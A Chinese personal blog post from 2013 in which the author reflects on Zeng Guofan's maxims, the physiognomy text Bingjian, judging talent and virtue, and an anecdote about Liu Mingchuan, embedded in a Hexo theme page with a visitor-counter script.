<div class="art_content">成大事者，以识为主，以才为辅。曾所处的时代，正是道光，同治朝，古老的中国繁华正在褪去，而又渐渐受洋人侵辱。可以说是历史上从未有过之局势。国内农民起义蜂起，又有国外患者，清政府受着极大的挑战。曾国藩于内于外都很注重了解内外的情形，然后从古代先贤或者外界来获得见识，然后极力推动改变，以维持中国的统治。同治时期，就已经是女主临朝，西太后权谋手段倒是很狠辣，杀肃顺，罢恭王，但是于国于民全然无益，无强策以御敌，无建树以兴政。若非君子明哲保身，必死于其手。素称国人诛同类不眨眼，而对外国人唯唯诺诺，其适于圣人意反也，于内则宜播乎仁，于外宜强也，一家之内尚且如此，若有父母于子女慈爱，于外有好强血性，则家兴焉，而国欲强于外，内须兴，内兴须有人和。当内乱外患之时，虽伟人可堪一世之功，终不免大厦将倾，王朝灰飞烟灭。人的眼光，很容易就局限自己所看到的，听到的，想到的。然殊不知，世界之大，需要博览群书，行万里路。宇宙之无穷，岂不移寸步开视野而可究者。当曾之时代，既需要儒家理学的修身之法，又需要存活打仗的经济手段，还要有长远见识。上仰权柄之鼻息，下察四野之民风，内观局势之变化，外防列强之觊觎。曾的智慧，需要深读方能领悟并运用，吾辈当此盛世，不用读四书五经，不用冲锋陷阵，但是生活其中，运用自如的道理是共通的。</div>
<div class="art_content">&nbsp;</div>
<div class="art_content">识人之术，《冰鉴》提出从人的外貌，行止，言语，气概来辨识一个人，这才是以貌取人。口诀：</div>
<blockquote class="art_content">
  <div>邪正看眼鼻，真假看嘴唇；功名看气概，富贵看精神；</div>
  <div>主意看指爪，风波看脚筋；若要看条理，全在言语中。</div>
</blockquote>
<div class="art_content">我等“外貌协会”的人，也会有从外貌言行去判别一个人的品格和为人。假若为人有正气，则其貌必然或雄健，或俊秀，或天真。俗语说“貌由心生”，其内心如果阳光正义，则其外貌必然不至于鄙陋（当人相貌也很多先天成分，很多长得好的说不定很丑恶）。观察一个人的外貌谈吐，大致就知道其为人怎样了。先不说《冰鉴》之中，是否有封建迷信，但我们仍旧是对那种相貌猥琐，行为浮动的人抱以鄙夷心态。我们人有好的秉性，如刚强，温柔，文雅，也有妖媚，奸诈，飘忽等不吉之态。总之就是各种情态，而态由心生，久而久之也就会影响容貌。一人心中坦荡无忧，必然睡眠好，心情好，自然气色好，外貌也就显得明朗，而其生活工作也必然顺遂。假如为人奸诈，飘忽，则好的秉性不容易驻足，会渐渐变得丑恶。吾所交之友，皆心地纯正，如思愿者相貌堂堂，身材健硕，桌升外貌佳，但言语较为木讷，然实为诚实稳重之人，广欣外貌刚毅，故言语刚直，易与人争执，然其为正义而争，大明肥胖，然而慈眉善目，为有福之人，国东文弱，然不至于。要是看女生，要眼睛明亮，此为聪明，要手脚匀称，此为灵巧，爱笑，则乐观豁达，最重要的不要傲娇。要是眼睛无神，见识浅薄，贪恋享受，即使再妩媚也会沦为风尘。总之一眼看上去，也大抵能猜个七八分。不过殷素素曾经说过，有一种漂亮女人是很有心计的，此种人一般魄力不凡，但是却眼神过于犀利，从眼睛的小动作能观察出来。然而人心难测，到底一个人怎样，要需要长期的观察和接触。但是一般与人为善者上，无害者中，冷漠无知者下，矫揉造作者下。</div>
<blockquote class="art_content">
  <div>&nbsp;</div>
  <div>读书以训诂为本，作诗文以声调为本，</div>
  <div>居家以不晏起为本，事亲以得欢心为本，</div>
  <div>养生以戒恼怒为本，立身以不妄语为本，</div>
  <div>作官以不要钱为本，行军以不扰民为本。</div>
  <div>&nbsp;</div>
</blockquote>
<div class="art_content">这些格言中，读书古时候大概如此，然而现代纷繁学问，训诂未必管用了，第二点赞同，第三点完全赞同，一个家庭，看它勤奋不勤奋，就看它的成员是否早起，早起的男人有责任感，女人能操持家务，当然现代中可能不太注重这点了，但是勤勉和谐总是一个家庭兴旺的本质。其他还有待从今后的体验中去验证。前人总结的每一句话，都是有一定意义的，因为这代表了他们的经验。而我们应该学会继承，带有批判地拿来，然后为我所用。读书于一个人的品性，大有用处，陶冶其情操，坚定其意志，开拓其视野，启发其智慧，勉励其上进，精进其技艺。书籍，往往是前人积累的财富，谁读了，领会了，谁就继承了这笔财富。精神世界富有了，我们又怎会担心物质之贫穷呢。</div>
<div class="art_content">&nbsp;</div>
<div class="art_content">山不能为大匠别生奇木，天亦不能为贤主更生异人。关键看如何培养，如何用人。才堪用者，以其器量大也，器不大则有才华，仍不能成伟大之人物。器量所在，胸襟也。故而有人说：有德有才，破格录用，有德无才，培养使用，有才无德，谨慎使用，无德无才，永不叙用。可见一个人的胸襟道德是最重要的。有些人有才能，但是心胸不够开阔，怨恨别人，斤斤计较，这样即使有才能，但是会让人觉得不安全，这样的同学必须要精进自己的德行，从而能够提升为有才有德的人。将对于下属，要识其才，任其能。有其能者当其位，才能令人信服，《将才》里说，如果没有足够的德才而占据这个位置的话，也不能服众，不能获得人的尊重。生活，工作中我们有可能会遇到这样的情况，以亲疏来定职位高低，这就是领导的失察，偏颇，将产生不良的后果，领导本身也会引起怨气，威望就下降。对于部下，要知道其长短，从而布置不同的工作，而工作好坏的赏罚，也要明确，这样才能做到公平。我认为，夫大材者，非一日成之，乃切磋琢磨而得。可造之才，能够顺应要求，做出改变，而不可造之才，愚钝迂腐，造的过程就是启发他，锻炼他。我是一个小小的职员，说这样的大话难免让人家笑话，不过也是，二十岁的小伙子是没有资格说这样的话，但是前人总结出来的经验，我们不得不深思。</div>
<div class="art_content">&nbsp;</div>
<div class="art_content">还有其中一个刘铭传的故事，令我印象深刻，刘铭传，霸气侧漏之人。遇到一伙强盗抢劫他家，父亲等人都吓呆了，刘铭传回来后，大怒，誓死要报此仇，并骂兄弟如此无能。于是去找那伙强盗指着痛骂，强盗人多，欺负他只不过是一个未成年的大孩子，从腰间抽出一把刀对他说：“你也不要骂了，你用这把刀杀了我，就算有种”，刘铭传二话不说，拍马向前，夺走那把刀，将那个强盗砍下马来，然后从从容容地下马割下那人首级。为人当如此，有如此胆识。</div>
<div class="art_content">&nbsp;</div>
<blockquote class="art_content">
  <div>
  <div>中华民族有一种骨气叫做倔强。</div>
  <div>&nbsp;</div>
</div>
  <div>家勤则兴，人勤则健。既勤且健，永不贫贱。</div>
  <div>&nbsp;</div>
  <div>恩莫过于仁，威莫过于礼。</div>
  <div>&nbsp;</div>
</blockquote>
<div class="art_content">细细思考每一句话，都能够震撼人心。如今摘录这几句我看到的认为很有用的话，用于铭记。中国近代令我佩服的有很多，曾文正算一个。用我现代的话说就是，我觉得他的语录里充满着“正能量”。当他晚年的时候，想功成身退，隐居著述，专心名山事业。哪个人不想安居乐业，万事无忧，读读书，旅旅游。然而有更大的责任要求有人要站出来承当，试问世间散乱，又怎能苟且偷安，用太平天国的忠王的话来说“欲凭赤手拯元元”，只要他敢担当，有才能，必然会被时代推到顶端，成为中华民族的脊梁。</div>
<div class="art_content">&nbsp;</div>
<div class="art_content">by bibodeng&nbsp;&nbsp;2013-8-5 23:59:03</div>
<div class="art_content">&nbsp;</div>
<div class="art_content">&nbsp;</div>
</div>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
  </section>

  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/7/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/7/">7</a><span class="page-number current">8</span><a class="page-number" href="/page/9/">9</a><span class="space">&hellip;</span><a class="page-number" href="/page/19/">19</a><a class="extend next" rel="next" href="/page/9/"><i class="fa fa-angle-right"></i></a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    <div class="sidebar-inner">

      

      

      <section class="site-overview sidebar-panel  sidebar-panel-active ">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
          <img class="site-author-image" itemprop="image"
               src="/images/bitcoin-cash-logo.svg"
               alt="bibodeng" />
          <p class="site-author-name" itemprop="name">bibodeng</p>
          <p class="site-description motion-element" itemprop="description">区块链爱好者，互联网从业者</p>
        </div>
        <nav class="site-state motion-element">
          <div class="site-state-item site-state-posts">
            <a href="/archives">
              <span class="site-state-item-count">185</span>
              <span class="site-state-item-name">日志</span>
            </a>
          </div>

          

          
            <div class="site-state-item site-state-tags">
              <a href="/tags">
                <span class="site-state-item-count">17</span>
                <span class="site-state-item-name">标签</span>
              </a>
            </div>
          

        </nav>

        

        <div class="links-of-author motion-element">
          
            
              <span class="links-of-author-item">
                <a href="https://github.com/bibodeng" target="_blank" title="Github">
                  
                    <i class="fa fa-fw fa-globe"></i>
                  
                  Github
                </a>
              </span>
            
              <span class="links-of-author-item">
                <a href="https://twitter.com/bibodeng" target="_blank" title="Twitter">
                  
                    <i class="fa fa-fw fa-twitter"></i>
                  
                  Twitter
                </a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://weibo.com/bibodeng" target="_blank" title="Weibo">
                  
                    <i class="fa fa-fw fa-weibo"></i>
                  
                  Weibo
                </a>
              </span>
            
          
        </div>

        
        

        
        
          <div class="links-of-blogroll motion-element links-of-blogroll-inline">
            <div class="links-of-blogroll-title">
              <i class="fa  fa-fw fa-globe"></i>
              Links
            </div>
            <ul class="links-of-blogroll-list">
              
                <li class="links-of-blogroll-item">
                  <a href="https://ifwallet.com" title="IFWallet" target="_blank">IFWallet</a>
                </li>
              
                <li class="links-of-blogroll-item">
                  <a href="https://ifpass.cash" title="IFPassword" target="_blank">IFPassword</a>
                </li>
              
            </ul>
          </div>
        

      </section>

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright" >
  
  &copy; 
  <span itemprop="copyrightYear">2018</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">bibodeng</span>
</div>

<div class="powered-by">
  由 <a class="theme-link" href="http://hexo.io">Hexo</a> 强力驱动
</div>

<div class="theme-info">
  主题 -
  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
    NexT.Mist
  </a>
</div>

        

        
      </div>
    </footer>

    <div class="back-to-top">
      <i class="fa fa-arrow-up"></i>
    </div>
  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  



  
  <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>

  
  <script type="text/javascript" src="/vendors/fastclick/lib/fastclick.min.js?v=1.0.6"></script>

  
  <script type="text/javascript" src="/vendors/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>

  
  <script type="text/javascript" src="/vendors/velocity/velocity.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.0.1"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.0.1"></script>



  
  

  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.0.1"></script>



  



  



  
  
  

  

  
  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.1.js"></script>
  <script>AV.initialize("RrMSWOa8nuCnCCWn8TyPa7Od-gzGzoHsz", "8xnzit83sqv6vUEuXlsEWe0s");</script>
  <script>
    function showTime(Counter) {
      var query = new AV.Query(Counter);
      var entries = [];
      var $visitors = $(".leancloud_visitors");

      $visitors.each(function () {
        entries.push( $(this).attr("id").trim() );
      });

      query.containedIn('url', entries);
      query.find()
        .done(function (results) {
          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';

          if (results.length === 0) {
            $visitors.find(COUNT_CONTAINER_REF).text(0);
            return;
          }

          for (var i = 0; i < results.length; i++) {
            var item = results[i];
            var url = item.get('url');
            var time = item.get('time');
            var element = document.getElementById(url);

            $(element).find(COUNT_CONTAINER_REF).text(time);
          }
        })
        .fail(function (object, error) {
          console.log("Error: " + error.code + " " + error.message);
        });
    }

    function addCount(Counter) {
      var $visitors = $(".leancloud_visitors");
      var url = $visitors.attr('id').trim();
      var title = $visitors.attr('data-flag-title').trim();
      var query = new AV.Query(Counter);

      query.equalTo("url", url);
      query.find({
        success: function(results) {
          if (results.length > 0) {
            var counter = results[0];
            counter.fetchWhenSave(true);
            counter.increment("time");
            counter.save(null, {
              success: function(counter) {
                var $element = $(document.getElementById(url));
                $element.find('.leancloud-visitors-count').text(counter.get('time'));
              },
              error: function(counter, error) {
                console.log('Failed to save Visitor num, with error message: ' + error.message);
              }
            });
          } else {
            var newcounter = new Counter();
            /* Set ACL */
            var acl = new AV.ACL();
            acl.setPublicReadAccess(true);
            acl.setPublicWriteAccess(true);
            newcounter.setACL(acl);
            /* End Set ACL */
            newcounter.set("title", title);
            newcounter.set("url", url);
            newcounter.set("time", 1);
            newcounter.save(null, {
              success: function(newcounter) {
                var $element = $(document.getElementById(url));
                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
              },
              error: function(newcounter, error) {
                console.log('Failed to create');
              }
            });
          }
        },
        error: function(error) {
          console.log('Error:' + error.code + " " + error.message);
        }
      });
    }

    $(function() {
      var Counter = AV.Object.extend("Counter");
      if ($('.leancloud_visitors').length == 1) {
        addCount(Counter);
      } else if ($('.post-title-link').length > 1) {
        showTime(Counter);
      }
    });
  </script>



  

</body>
</html>
